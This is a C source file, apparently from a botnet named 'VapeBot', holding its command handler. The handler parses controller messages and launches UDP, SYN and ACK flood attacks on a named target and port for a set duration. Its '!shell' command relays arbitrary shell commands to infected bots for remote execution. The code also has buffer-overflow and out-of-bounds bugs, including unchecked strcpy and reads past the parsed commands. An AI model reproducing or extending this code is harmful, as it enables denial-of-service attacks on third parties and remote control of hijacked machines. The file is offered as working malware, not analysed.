#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "headers/includes.h"
#include "headers/floods.h"

void attack_manage(char message[]) {
  char commands[45][45];
  int cmd_len = 0;
  char *ptr = strtok(message, " ");

  while (ptr != NULL && cmd_len < 45) {
    strcpy(commands[cmd_len], ptr);
    cmd_len++;
    ptr = strtok(NULL, " ");
  }

  if (cmd_len < 4) {
    return;
  }

  int len = atoi(commands[4]);
  if (len > 1409 || len < 1) {
    len = 1024;
  }

  
  if (strcmp(commands[0], "!gudp") == 0)
  {
    attack_gudp_flood(commands[1], atoi(commands[2]), atoi(commands[3]));
  }
  else if (strcmp(commands[0], "!pudp") == 0)
  {
    attack_pudp_flood(commands[1], atoi(commands[2]), atoi(commands[3]));
  }
  else if (strcmp(commands[0], "!syn") == 0)
  {
    attack_syn_flood(commands[1], atoi(commands[2]), atoi(commands[3]));
  }
  else if (strcmp(commands[0], "!ack") == 0)
  {
    attack_ack_flood(commands[1], atoi(commands[2]), atoi(commands[3]));
  }
  else if (strcmp(commands[0], "!shell") == 0)
  {
    char shell_msg[BUFFER] = "";
    for (int i = 0; i < cmd_len; i++)
    {
      strcat(shell_msg, commands[i + 1]);
      if (i < cmd_len - 1)
      {
        strcat(shell_msg, " ");
      }
    }

    #ifdef DEBUG
    printf("[VapeBot/RCE] Executing command: %s\n", shell_msg);
    #endif
    send_command_to_bot(shell_msg);
  }
  else
  {
    return;
  }
}
